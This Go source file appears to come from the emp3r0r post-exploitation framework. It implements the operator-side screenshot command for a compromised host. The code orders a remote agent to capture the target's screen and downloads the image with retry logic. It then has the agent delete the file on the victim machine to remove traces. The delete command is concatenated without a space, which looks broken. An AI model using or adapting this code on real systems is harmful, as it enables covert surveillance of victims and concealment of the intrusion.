//go:build linux
// +build linux

package cc

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// TakeScreenshot take a screenshot of selected target, and download it
// open the picture if possible
func TakeScreenshot(cmd *cobra.Command, args []string) {
	// tell agent to take screenshot
	screenshotErr := SendCmdToCurrentTarget("screenshot", "")
	if screenshotErr != nil {
		LogError("send screenshot cmd: %v", screenshotErr)
		return
	}

	// then we handle the cmd output in agentHandler
}

func processScreenshot(out string, target *emp3r0r_def.Emp3r0rAgent) (err error) {
	if strings.Contains(out, "Error") {
		return fmt.Errorf("%s", out)
	}
	LogInfo("We will get %s screenshot file for you, wait", strconv.Quote(out))
	_, err = GetFile(out, target)
	if err != nil {
		err = fmt.Errorf("get screenshot: %v", err)
		return
	}

	// basename
	path := util.FileBaseName(out)

	// be sure we have downloaded the file
	is_download_completed := func() bool {
		return !util.IsExist(FileGetDir+path+".downloading") &&
			util.IsExist(FileGetDir+path)
	}

	is_download_corrupted := func() bool {
		return !is_download_completed() && !util.IsExist(FileGetDir+path+".lock")
	}
	for {
		time.Sleep(100 * time.Millisecond)
		if is_download_completed() {
			break
		}
		if is_download_corrupted() {
			LogWarning("Processing screenshot %s: incomplete download detected, retrying...",
				strconv.Quote(out))
			return processScreenshot(out, target)
		}
	}

	// unzip if it's zip
	if strings.HasSuffix(path, ".zip") {
		err = util.Unarchive(FileGetDir+path, FileGetDir)
		if err != nil {
			return fmt.Errorf("unarchive screenshot zip: %v", err)
		}
		LogWarning("Multiple screenshots extracted to %s", FileGetDir)
		return
	}

	// open it if possible
	if util.IsCommandExist("xdg-open") &&
		os.Getenv("DISPLAY") != "" {
		LogInfo("Seems like we can open the picture (%s) for you to view, hold on",
			FileGetDir+path)
		cmd := exec.Command("xdg-open", FileGetDir+path)
		err = cmd.Start()
		if err != nil {
			return fmt.Errorf("crap, we cannot open the picture: %v", err)
		}
	}

	// tell agent to delete the remote file
	err = SendCmd("rm --path"+out, "", target)
	if err != nil {
		LogWarning("Failed to delete remote file %s: %v", strconv.Quote(out), err)
	}

	return
}
